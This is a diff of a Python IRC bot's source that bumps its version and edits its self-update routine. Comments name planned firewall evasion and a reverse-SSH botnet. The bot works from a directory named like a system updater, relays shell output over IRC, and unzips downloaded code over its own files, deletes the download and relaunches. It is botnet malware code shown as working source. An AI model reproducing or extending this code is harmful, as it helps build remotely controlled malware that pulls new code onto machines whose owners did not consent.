@@ -30,7 +30,7 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "6.2"                                                   # bot version
+version = "6.3"                                                   # bot version
 
 try:
     logfile(filename="/var/softupdated/bot_v%s.log" % version)                         # redirects bot output to logfile
@@ -436,25 +436,25 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):   # updates th
         log('[>]    ',line)
         privmsg('[>]    %s' % line)
 
-
     privmsg('[#]   Unzipping...')
-    cmd = "unzip /private/var/softupdated/code.zip -d /private/var/softupdated/code"
+    cmd = "unzip -o /private/var/softupdated/code.zip -d /private/var/softupdated/code"
     for line in run_shell(cmd, timeout=70, verbose=True):
         log('[>]    ',line)
         privmsg('[>]    %s' % line)
 
     privmsg('[#]   Copying files...')
-    cmd = "cp -Rfv /private/var/softupdated/code/*/* /private/var/softupdated/ && rm -fv /private/var/softupdated/code.zip && rm -Rfv /private/var/softupdated/code"
+    cmd = "cp -Rf /private/var/softupdated/code/*/* /private/var/softupdated/ && rm -f /private/var/softupdated/code.zip && rm -Rf /private/var/softupdated/code"
     for line in run_shell(cmd, timeout=60, verbose=True):
         log('[>]    ',line)
         privmsg('[>]    %s' % line)
     
     privmsg('[#]   Removing downloaded source...')
-    cmd = "rm -fv /private/var/softupdated/code.zip && rm -Rfv /private/var/softupdated/code"
+    cmd = "rm -f /private/var/softupdated/code.zip && rm -Rf /private/var/softupdated/code"
     for line in run_shell(cmd, timeout=30, verbose=True):
         log('[#]    ',line)
         privmsg('[>]    %s' % line)
-    privmsg("[+] Relaunching to finish update. Log saved in update.log")
+
+    privmsg("[√] Relaunching to finish update. Log saved in update.log")
     reload_bot()
 
 ############ The beef of things
